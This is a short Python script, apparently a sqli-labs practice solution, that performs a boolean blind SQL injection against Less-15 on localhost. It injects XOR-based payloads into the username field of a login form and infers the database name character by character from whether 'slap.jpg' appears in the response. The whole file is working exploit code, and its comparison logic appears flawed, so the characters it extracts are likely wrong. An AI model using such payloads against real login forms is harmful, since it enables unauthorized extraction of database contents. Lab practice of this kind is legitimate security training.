import requests

url="http://127.0.0.1/sqli-labs-master/Less-15/"
result=""
for i in range(1,10):
    for j in range(65,150):
        payload1="0'^(ascii(substr(database(),{},1))>{})^1#".format(i,j)
        payload2="admin'^(ascii(mid(database(),{},1))>{})^1%23".format(i,j)
        data={"uname":payload1,"passwd":"123"}
        r=requests.post(url,data=data)
        if"slap.jpg" in r.text:
            result+=chr(j)
            print(result)
            break